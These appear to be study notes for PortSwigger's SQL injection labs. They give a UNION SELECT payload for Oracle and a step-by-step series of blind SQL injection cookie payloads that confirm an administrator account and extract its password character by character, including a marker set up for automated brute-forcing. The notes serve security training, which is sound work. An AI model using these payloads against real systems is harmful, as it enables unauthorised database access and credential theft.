## Cheatsheat - https://portswigger.net/web-security/sql-injection/cheat-sheet


On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:

`' UNION SELECT NULL FROM DUAL--`

The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.
For more details of database-specific syntax, see the SQL injection cheat sheet.

### Lab: Blind SQL injection with conditional responses
```
TrackingId=xyz' AND '1'='1
```
```
TrackingId=xyz' AND '1'='2
```
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

```
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

```
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

```
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§

```
